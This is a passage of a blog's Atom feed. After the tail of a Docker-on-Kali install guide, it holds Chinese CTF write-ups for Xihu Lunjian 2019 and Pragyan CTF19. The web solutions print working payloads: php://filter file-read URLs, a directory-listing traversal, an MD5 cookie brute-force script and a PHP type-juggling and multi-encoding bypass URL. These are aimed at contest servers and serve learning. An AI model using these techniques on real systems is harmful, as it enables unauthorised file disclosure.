58118E89F3A912897C070ADBF76221572C52609D</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> 'deb https:<span class="string">//apt.dockerproject.org/repo</span> debian-stretch main' &gt; <span class="string">/etc/apt/sources.list.d/docker.list</span></span><br></pre></td></tr></table></figure><h1 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h1><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">apt-<span class="builtin-name">get</span> update</span><br><span class="line"></span><br><span class="line">apt-<span class="builtin-name">get</span> install docker-engine</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第一步&quot;&gt;&lt;a href=&quot;#第一步&quot; class=&quot;headerlink&quot; title=&quot;第一步&quot;&gt;&lt;/a&gt;第一步&lt;/h1&gt;&lt;figure class=&quot;highlight routeros&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre
      
    
    </summary>
    
      <category term="kali" scheme="http://chenxiyuan.vip/categories/kali/"/>
    
    
      <category term="docker" scheme="http://chenxiyuan.vip/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>西湖论剑2019</title>
    <link href="http://chenxiyuan.vip/2019/04/07/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912019/"/>
    <id>http://chenxiyuan.vip/2019/04/07/西湖论剑2019/</id>
    <published>2019-04-07T01:58:56.000Z</published>
    <updated>2019-05-07T12:46:16.149Z</updated>
    
    <content type="html"><![CDATA[<p>#CRYPTO哈夫曼之谜<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">11000111000001010010010101100110110101111101110101011110111111100001000110010110101111001101110001000110</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:4</span></span><br><span class="line"><span class="selector-tag">d</span><span class="selector-pseudo">:9</span></span><br><span class="line"><span class="selector-tag">g</span><span class="selector-pseudo">:1</span></span><br><span class="line"><span class="selector-tag">f</span><span class="selector-pseudo">:5</span></span><br><span class="line"><span class="selector-tag">l</span><span class="selector-pseudo">:1</span></span><br><span class="line"><span class="selector-tag">0</span><span class="selector-pseudo">:7</span></span><br><span class="line"><span class="selector-tag">5</span><span class="selector-pseudo">:9</span></span><br><span class="line">&#123;<span class="selector-pseudo">:1</span></span><br><span class="line">&#125;<span class="selector-pseudo">:1</span></span><br></pre></td></tr></table></figure></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> huffman</span><br><span class="line"><span class="keyword">import</span> collections</span><br><span class="line">t1=huffman.codebook([(<span class="string">'a'</span>, <span class="number">4</span>), (<span class="string">'d'</span>, <span class="number">9</span>), (<span class="string">'g'</span>, <span class="number">1</span>), (<span class="string">'f'</span>, <span class="number">5</span>),(<span class="string">'l'</span>, <span class="number">1</span>),(<span class="string">'0'</span>, <span class="number">7</span>),(<span class="string">'5'</span>, <span class="number">9</span>),(<span class="string">'&#123;'</span>, <span class="number">1</span>),(<span class="string">'&#125;'</span>, <span class="number">1</span>)])</span><br><span class="line">print(t1)</span><br><span class="line"><span class="comment">#&#123;'a': '000', 'd': '10', 'g': '00100', 'f': '110', 'l': '00101', '0': '111', '5': '01', '&#123;': '00111', '&#125;': '00110'&#125;</span></span><br><span class="line"><span class="comment">#得到f&#123;algddf5dfd0f05550500a5af55dd0d5d0ad&#125;，权重一样的位置可以交换，最后提交ddf5dfd0f05550500a5af55dd0d5d0ad成功</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>#babyt3<br><a href="http://ctf1.linkedbyx.com:10300" target="_blank" rel="noopener">http://ctf1.linkedbyx.com:10300</a><br>首页发现是任意文件读取，然后又看到hint，base64解码得到dir.php,然后用php伪协议读取dir.php，再base64解码<br>payload:<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://ctf1.linkedbyx.com:<span class="number">10300</span>/?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=dir.php</span><br></pre></td></tr></table></figure></p><p>得到源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = @$_GET[<span class="string">'dir'</span>];</span><br><span class="line"><span class="keyword">if</span>(!$a)&#123;</span><br><span class="line">$a = <span class="string">'/tmp'</span>;</span><br><span class="line">&#125;</span><br><span class="line">var_dump(scandir($a));</span><br></pre></td></tr></table></figure></p><p>scandir() 函数返回指定目录中的文件和目录的数组,再同级和上级目录都试试，发现上级目录是存在文件的<br>payload：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>ctf1.linkedbyx.com:<span class="number">10300</span><span class="regexp">/dir.php?dir=/</span>..</span><br></pre></td></tr></table></figure></p><p>返回目录信息<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(<span class="number">25</span>) &#123; [<span class="number">0</span>]=&gt; <span class="type">string</span>(<span class="number">1</span>) <span class="string">"."</span> [<span class="number">1</span>]=&gt; <span class="type">string</span>(<span class="number">2</span>) <span class="string">".."</span> [<span class="number">2</span>]=&gt; <span class="type">string</span>(<span class="number">10</span>) <span class="string">".dockerenv"</span> [<span class="number">3</span>]=&gt; <span class="type">string</span>(<span class="number">3</span>) <span class="string">"bin"</span> [<span class="number">4</span>]=&gt; <span class="type">string</span>(<span class="number">4</span>) <span class="string">"boot"</span> [<span class="number">5</span>]=&gt; <span class="type">string</span>(<span class="number">3</span>) <span class="string">"dev"</span> [<span class="number">6</span>]=&gt; <span class="type">string</span>(<span class="number">3</span>) <span class="string">"etc"</span> [<span class="number">7</span>]=&gt; <span class="type">string</span>(<span class="number">16</span>) <span class="string">"ffffflag_1s_Her4"</span> [<span class="number">8</span>]=&gt; <span class="type">string</span>(<span class="number">4</span>) <span class="string">"home"</span> [<span class="number">9</span>]=&gt; <span class="type">string</span>(<span class="number">3</span>) <span class="string">"lib"</span> [<span class="number">10</span>]=&gt; <span class="type">string</span>(<span class="number">5</span>) <span class="string">"lib64"</span> [<span class="number">11</span>]=&gt; <span class="type">string</span>(<span class="number">5</span>) <span class="string">"media"</span> [<span class="number">12</span>]=&gt; <span class="type">string</span>(<span class="number">3</span>) <span class="string">"mnt"</span> [<span class="number">13</span>]=&gt; <span class="type">string</span>(<span class="number">7</span>) <span class="string">"my_init"</span> [<span class="number">14</span>]=&gt; <span class="type">string</span>(<span class="number">10</span>) <span class="string">"my_service"</span> [<span class="number">15</span>]=&gt; <span class="type">string</span>(<span class="number">3</span>) <span class="string">"opt"</span> [<span class="number">16</span>]=&gt; <span class="type">string</span>(<span class="number">4</span>) <span class="string">"proc"</span> [<span class="number">17</span>]=&gt; <span class="type">string</span>(<span class="number">4</span>) <span class="string">"root"</span> [<span class="number">18</span>]=&gt; <span class="type">string</span>(<span class="number">3</span>) <span class="string">"run"</span> [<span class="number">19</span>]=&gt; <span class="type">string</span>(<span class="number">4</span>) <span class="string">"sbin"</span> [<span class="number">20</span>]=&gt; <span class="type">string</span>(<span class="number">3</span>) <span class="string">"srv"</span> [<span class="number">21</span>]=&gt; <span class="type">string</span>(<span class="number">3</span>) <span class="string">"sys"</span> [<span class="number">22</span>]=&gt; <span class="type">string</span>(<span class="number">3</span>) <span class="string">"tmp"</span> [<span class="number">23</span>]=&gt; <span class="type">string</span>(<span class="number">3</span>) <span class="string">"usr"</span> [<span class="number">24</span>]=&gt; <span class="type">string</span>(<span class="number">3</span>) <span class="string">"var"</span> &#125;</span><br></pre></td></tr></table></figure></p><p>发现ffffflag_1s_Her4，再读取就好了，得到flag<br>payload：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>ctf1.linkedbyx.com:<span class="number">10300</span><span class="regexp">/?file=/</span>ffffflag_1s_Her4</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;#CRYPTO哈夫曼之谜&lt;br&gt;&lt;figure class=&quot;highlight less&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;selector-tag&quot;&gt;11000111000001010010010101100110110101111101110101011110111111100001000110010110101111001101110001000110&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;selector-tag&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;selector-pseudo&quot;&gt;:4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;selector-tag&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;selector-pseudo&quot;&gt;:9&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;selector-tag&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;selector-pseudo&quot;&gt;:1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;selector-tag&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;selector-pseudo&quot;&gt;:5&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;selector-tag&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;selector-pseudo&quot;&gt;:1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;selector-tag&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;selector-pseudo&quot;&gt;:7&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;selector-tag&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;selector-pseudo&quot;&gt;:9&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;span class=&quot;selector-pseudo&quot;&gt;:1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;span class=&quot;selector-pseudo&quot;&gt;:1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; huffman&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; collections&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;t1=huffman.codebook([(&lt;span class=&quot;string&quot;&gt;&#39;a&#39;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;), (&lt;span class=&quot;string&quot;&gt;&#39;d&#39;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;9&lt;/span&gt;), (&lt;span class=&quot;string&quot;&gt;&#39;g&#39;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;), (&lt;span class=&quot;string&quot;&gt;&#39;f&#39;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;),(&lt;span class=&quot;string&quot;&gt;&#39;l&#39;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;),(&lt;span class=&quot;string&quot;&gt;&#39;0&#39;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;),(&lt;span class=&quot;string&quot;&gt;&#39;5&#39;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;9&lt;/span&gt;),(&lt;span class=&quot;string&quot;&gt;&#39;&amp;#123;&#39;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;),(&lt;span class=&quot;string&quot;&gt;&#39;&amp;#125;&#39;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;print(t1)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#&amp;#123;&#39;a&#39;: &#39;000&#39;, &#39;d&#39;: &#39;10&#39;, &#39;g&#39;: &#39;00100&#39;, &#39;f&#39;: &#39;110&#39;, &#39;l&#39;: &#39;00101&#39;, &#39;0&#39;: &#39;111&#39;, &#39;5&#39;: &#39;01&#39;, &#39;&amp;#123;&#39;: &#39;00111&#39;, &#39;&amp;#125;&#39;: &#39;00110&#39;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#得到f&amp;#123;algddf5dfd0f05550500a5af55dd0d5d0ad&amp;#125;，权重一样的位置可以交换，最后提交ddf5dfd0f05550500a5af55dd0d5d0ad成功&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="http://chenxiyuan.vip/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Pragyan CTF19 webwp</title>
    <link href="http://chenxiyuan.vip/2019/03/10/Pragyan-CTF19-webwp/"/>
    <id>http://chenxiyuan.vip/2019/03/10/Pragyan-CTF19-webwp/</id>
    <published>2019-03-10T06:14:22.000Z</published>
    <updated>2019-05-07T12:46:59.073Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Cookie-Monster-100"><a href="#Cookie-Monster-100" class="headerlink" title="Cookie Monster 100"></a>Cookie Monster 100</h2><p>Do prepare to see cookies lurking everywhere. <a href="http://159.89.166.12:13500/" target="_blank" rel="noopener">http://159.89.166.12:13500/</a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">flag = []</span><br><span class="line">wordlist = string.printable</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">40</span>):</span><br><span class="line">    cookie = s.get(<span class="string">'http://159.89.166.12:13500/'</span>).cookies[<span class="string">'flag'</span>]</span><br><span class="line">    flag.append(cookie)</span><br><span class="line"><span class="keyword">print</span> (flag)</span><br><span class="line"></span><br><span class="line">result= []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> permutations(wordlist,<span class="number">2</span>):</span><br><span class="line">        guess = <span class="string">""</span>.join(j)</span><br><span class="line">        md5 = hashlib.md5(guess.encode(<span class="string">"utf8"</span>)).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> md5 ==i:</span><br><span class="line">            result.append(guess)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> (result)</span><br></pre></td></tr></table></figure></p><a id="more"></a><h2 id="Game-of-Faces-100"><a href="#Game-of-Faces-100" class="headerlink" title="Game of Faces 100"></a>Game of Faces 100</h2><p>The Game of Faces, welcomes you. In this era, where AIs generate a lot of faces, we would like you to contribute to the same by uploading your image. Thank you for contributing, to continue.</p><p><a href="http://159.89.166.12:15000/" target="_blank" rel="noopener">http://159.89.166.12:15000/</a><br><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">把css删掉，发现一个假的提交，得到一个base64，解码得The_scroll_says=the_night_kingVSvalyrian.txt，然后直接访问。。。</span><br><span class="line"><span class="symbol">http:</span><span class="comment">//159.89.166.12:15000/the_night_kingVSvalyrian.txt</span></span><br></pre></td></tr></table></figure></p><h2 id="Mandatory-PHP-125"><a href="#Mandatory-PHP-125" class="headerlink" title="Mandatory PHP 125"></a>Mandatory PHP 125</h2><p>PHP, PHP everywhere get the flag and earn your points there.</p><p><a href="http://159.89.166.12:14000/" target="_blank" rel="noopener">http://159.89.166.12:14000/</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>; </span><br><span class="line">highlight_file(<span class="string">'index.php'</span>); </span><br><span class="line">$a = $_GET[<span class="string">"val1"</span>]; </span><br><span class="line">$b = $_GET[<span class="string">"val2"</span>]; </span><br><span class="line">$c = $_GET[<span class="string">"val3"</span>]; </span><br><span class="line">$d = $_GET[<span class="string">"val4"</span>]; </span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/[^A-Za-z]/'</span>, $a)) </span><br><span class="line"><span class="keyword">die</span>(<span class="string">'oh my gawd...'</span>); </span><br><span class="line">$a=hash(<span class="string">"sha256"</span>,$a); </span><br><span class="line">$a=(log10($a**(<span class="number">0.5</span>)))**<span class="number">2</span>;  <span class="comment">//传入 $a='pp';会发现 float(INF) php</span></span><br><span class="line"><span class="keyword">if</span>($c&gt;<span class="number">0</span>&amp;&amp;$d&gt;<span class="number">0</span>&amp;&amp;$d&gt;$c&amp;&amp;$a==$c*$c+$d*$d) <span class="comment">//这里也传入无限大</span></span><br><span class="line">$s1=<span class="string">"true"</span>; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Bye..."</span>); </span><br><span class="line"><span class="keyword">if</span>($s1===<span class="string">"true"</span>) </span><br><span class="line">    <span class="keyword">echo</span> $flag1; </span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">1</span>;$i&lt;=<span class="number">10</span>;$i++)&#123; </span><br><span class="line">    <span class="keyword">if</span>($b==urldecode($b))  <span class="comment">//编码11次</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'duck'</span>); </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        $b=urldecode($b); </span><br><span class="line">&#125;     </span><br><span class="line"><span class="keyword">if</span>($b===<span class="string">"WoAHh!"</span>) </span><br><span class="line">$s2=<span class="string">"true"</span>; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'oops..'</span>); </span><br><span class="line"><span class="keyword">if</span>($s2===<span class="string">"true"</span>) </span><br><span class="line">    <span class="keyword">echo</span> $flag2; </span><br><span class="line"><span class="keyword">die</span>(<span class="string">'end...'</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload: <a href="http://159.89.166.12:14000/?val1=pp&amp;val2=WoAHh%2525252525252525252521&amp;val3=1&amp;val4=100000000004000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" target="_blank" rel="noopener">http://159.89.166.12:14000/?val1=pp&amp;val2=WoAHh%2525252525252525252521&amp;val3=1&amp;val4=100000000004000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Cookie-Monster-100&quot;&gt;&lt;a href=&quot;#Cookie-Monster-100&quot; class=&quot;headerlink&quot; title=&quot;Cookie Monster 100&quot;&gt;&lt;/a&gt;Cookie Monster 100&lt;/h2&gt;&lt;p&gt;Do prepare to see cookies lurking everywhere. &lt;a href=&quot;http://159.89.166.12:13500/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://159.89.166.12:13500/&lt;/a&gt;&lt;br&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; hashlib&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; itertools &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; string&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;flag = []&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;wordlist = string.printable&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;s = requests.session()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; range(&lt;span class=&quot;number&quot;&gt;40&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    cookie = s.get(&lt;span class=&quot;string&quot;&gt;&#39;http://159.89.166.12:13500/&#39;&lt;/span&gt;).cookies[&lt;span class=&quot;string&quot;&gt;&#39;flag&#39;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    flag.append(cookie)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;print&lt;/span&gt; (flag)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;result= []&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; flag:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; j &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; permutations(wordlist,&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        guess = &lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;.join(j)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        md5 = hashlib.md5(guess.encode(&lt;span class=&quot;string&quot;&gt;&quot;utf8&quot;&lt;/span&gt;)).hexdigest()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; md5 ==i:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            result.append(guess)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;print&lt;/span&gt; (result)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="web安全" scheme="http://chenxiyuan.vip/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>bugku速度要快wp</title>
    <link href="http://chenxiyuan.vip/2018/12/10/bugku%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%ABwp/"/>
